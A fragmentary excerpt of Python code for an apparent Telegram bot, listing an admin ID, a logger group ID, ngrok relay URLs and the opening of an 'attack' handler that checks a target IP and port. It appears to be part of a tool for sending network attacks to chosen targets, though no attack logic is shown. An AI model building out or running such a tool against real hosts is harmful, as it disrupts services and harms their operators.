...
ADMIN_USER_ID = 5344691638  # Replace with the actual admin user ID
LOGGER_GROUP_ID = -1002226609740  # Replace with your actual logger group ID
...
ngrok_urls = [
    "https://1211-13-60-225-94.ngrok-free.app"
]
...
async def attack(update: Update, context: CallbackContext):
    ...
    # Check if the combination of IP and por
...
ngrok_urls = [
    "https://7542-2600-1f16-1e80-f200-65de-da2a-58f0-78fc.ngrok-free.app",
    "https://a57f-2600-1f16-1e80-f200-c072-9657-94a3-6168.ngrok-free.app",
